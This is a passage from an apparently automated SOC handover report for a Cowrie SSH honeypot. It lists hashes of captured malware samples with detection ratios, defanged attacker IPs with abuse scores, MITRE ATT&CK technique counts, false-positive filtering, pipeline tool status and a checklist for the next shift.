| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `89.233.194[.]35` | SE | Bredband2 AB | **100** ⚠️ | 8 |
| `83.239.84[.]130` | RU | OJSC Rostelecom Macroregional Branch South | **100** ⚠️ | 50 |
| `183.171.153[.]243` | MY | Celcom Axiata Berhad | **100** ⚠️ | 7 |
| `102.90.34[.]90` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `168.96.252[.]158` | AR | Fundación InnovaT | **100** ⚠️ | 3 |
| `111.70.21[.]178` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 50 |
| `179.48.54[.]162` | PE | IWAY TELECOM SOCIEDAD ANONIMA CERRADA | **100** ⚠️ | 50 |
| `180.167.207[.]234` | CN | CHINANET SHANGHAI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `172.178.16[.]179` | US | Microsoft Limited | **100** ⚠️ | 31 |
| `59.93.36[.]136` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 23 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 85 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 51 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 10 below threshold 25 | 5 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 148 cases |
| Tool 34  | Credential Extractor        | ✅ 62 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 48 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (14.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 43 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 11 priority case(s) shown individually · 33 recon entry/entries in table (13 group(s) consolidating 95 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-26T19:02:50Z_
